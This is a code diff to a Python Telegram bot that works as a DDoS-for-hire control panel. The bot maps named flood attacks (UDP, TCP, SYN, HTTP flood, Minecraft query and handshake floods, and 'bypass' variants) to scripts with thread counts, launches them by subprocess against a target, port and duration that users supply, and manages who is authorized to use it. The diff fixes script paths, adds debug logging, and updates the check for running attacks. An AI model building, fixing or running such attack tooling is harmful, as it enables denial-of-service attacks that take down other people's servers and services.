@@ -21,32 +21,35 @@ running_attacks = {}
 bot = telebot.TeleBot(BOT_TOKEN)
 lock = threading.Lock()
 
-# ========== ATTACK SCRIPT MAP ==========
+# ========== BASE DIRECTORY ==========
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# ========== ATTACK SCRIPT MAP (Main Folder) ==========
 ATTACK_SCRIPTS = {
-    'udp': ('attacks/udp.py', 500),
-    'tcp': ('attacks/tcp.py', 300),
-    'syn': ('attacks/syn.py', 300),
-    'httpflood': ('attacks/httpflood.py', 200),
-    'tudp': ('attacks/tudp.py', 1500),
-    'mc': ('attacks/mc.py', 1000),
-    'mcquery': ('attacks/mcquery.py', 800),
-    'mchandshake': ('attacks/mchandshake.py', 600),
-    'udpbypass': ('attacks/udpbypass.py', 1200),
-    'tcpbypass': ('attacks/tcpbypass.py', 800),
-    'gudp': ('attacks/gudp.py', 1500),
+    'udp': (os.path.join(BASE_DIR, "udp.py"), 500),
+    'tcp': (os.path.join(BASE_DIR, "tcp.py"), 300),
+    'syn': (os.path.join(BASE_DIR, "syn.py"), 300),
+    'httpflood': (os.path.join(BASE_DIR, "httpflood.py"), 200),
+    'tudp': (os.path.join(BASE_DIR, "tudp.py"), 1500),
+    'mc': (os.path.join(BASE_DIR, "mc.py"), 1000),
+    'mcquery': (os.path.join(BASE_DIR, "mcquery.py"), 800),
+    'mchandshake': (os.path.join(BASE_DIR, "mchandshake.py"), 600),
+    'udpbypass': (os.path.join(BASE_DIR, "udpbypass.py"), 1200),
+    'tcpbypass': (os.path.join(BASE_DIR, "tcpbypass.py"), 800),
+    'gudp': (os.path.join(BASE_DIR, "gudp.py"), 1500),
 }
 
 # ========== FUNCTIONS ==========
 
 def load_users():
     try:
-        with open(USER_FILE, "r") as f:
+        with open(os.path.join(BASE_DIR, USER_FILE), "r") as f:
             return [line.strip() for line in f if line.strip()]
     except:
         return []
 
 def save_user(user_id):
-    with open(USER_FILE, "a") as f:
+    with open(os.path.join(BASE_DIR, USER_FILE), "a") as f:
         f.write(f"{user_id}\n")
 
 def execute_attack(user_id, attack_type, target, port, duration):
@@ -60,6 +63,10 @@ def execute_attack(user_id, attack_type, target, port, duration):
 
     script_path, threads = ATTACK_SCRIPTS[attack_type]
 
+    # Debug: print the path
+    print(f"[DEBUG] Looking for: {script_path}")
+    print(f"[DEBUG] File exists: {os.path.exists(script_path)}")
+
     if not os.path.exists(script_path):
         return False, f"Script not found: {script_path}"
 
@@ -69,8 +76,8 @@ def execute_attack(user_id, attack_type, target, port, duration):
         def run_attack():
             try:
                 subprocess.run(cmd, check=True, capture_output=True, text=True)
-            except:
-                pass
+            except Exception as e:
+                print(f"[ERROR] Attack failed: {e}")
 
         thread = threading.Thread(target=run_attack, daemon=True)
         thread.start()
@@ -173,7 +180,7 @@ def check_command(message):
         bot.reply_to(message, "❌ Not authorized")
         return
     
-    result = subprocess.getoutput("ps aux | grep -E 'python3.*attacks/.*\\.py' | grep -v grep")
+    result = subprocess.getoutput(f"ps aux | grep -E 'python3.*(udp|tcp|syn|httpflood|tudp|mc|mcquery|mchandshake|udpbypass|tcpbypass|gudp)\\.py' | grep -v grep")
     if result:
         response = f"🟢 ATTACK RUNNING!\n\n{result[:300]}"
     else:
@@ -222,7 +229,7 @@ def remove_command(message):
         bot.reply_to(message, f"User {user_to_remove} not found")
         return
     allowed_users = [u for u in allowed_users if u != user_to_remove]
-    with open(USER_FILE, "w") as f:
+    with open(os.path.join(BASE_DIR, USER_FILE), "w") as f:
         for u in allowed_users:
             f.write(f"{u}\n")
     bot.reply_to(message, f"✅ User {user_to_remove} removed")
@@ -299,6 +306,7 @@ if __name__ == "__main__":
     print(f"[+] Loaded {len(allowed_users)} users")
     print(f"[+] Admin IDs: {ADMIN_IDS}")
     print(f"[+] Attack scripts: {len(ATTACK_SCRIPTS)}")
+    print(f"[+] Scripts directory: {BASE_DIR}")
     print("=" * 50)
     print("[+] Bot running! Press Ctrl+C to stop.")
     bot.polling(none_stop=True)
